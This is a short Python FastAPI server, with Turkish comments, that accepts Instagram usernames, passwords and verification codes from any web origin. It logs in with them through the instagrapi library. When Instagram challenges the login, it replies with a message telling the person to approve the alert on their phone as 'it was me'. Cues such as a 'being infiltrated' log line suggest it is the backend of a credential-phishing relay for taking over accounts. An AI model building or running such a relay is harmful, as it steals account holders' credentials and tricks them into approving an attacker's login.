import os
import time
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from instagrapi import Client

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

class AuthData(BaseModel):
    username: str
    password: str
    verification_code: str = ""

# Global client nesnesi (Oturumu canlı tutmak için)
cl = Client()

@app.post("/api/v4/auth/link")
async def link_account(data: AuthData):
    try:
        # 1. Kod geldiyse direkt onayla
        if data.verification_code:
            cl.checkpoint_login(data.verification_code)
            return {"status": "success", "message": "TUNEL SABITLENDI!"}

        # 2. Giriş yapmayı dene
        print(f"Siziliyor: {data.username}")
        login_result = cl.login(data.username, data.password)
        
        if login_result:
            return {"status": "success", "message": "GIRIS BASARILI!"}

    except Exception as e:
        err = str(e).lower()
        
        # EĞER BİLDİRİM DÜŞÜYORSA BURASI ÇALIŞIR
        if "challenge" in err or "checkpoint" in err:
            # Instagram'a bildirim göndermesini söylüyoruz
            try:
                cl.challenge_resolve(cl.last_json)
            except:
                pass
            
            return {
                "status": "challenge", 
                "message": "BILDIRIM DÜŞTÜ! Telefona gir, 'BENDİM' de ve 5 saniye sonra bu kutuya 'OK' yazıp gönder."
            }
        
        return {"status": "error", "message": str(e)}
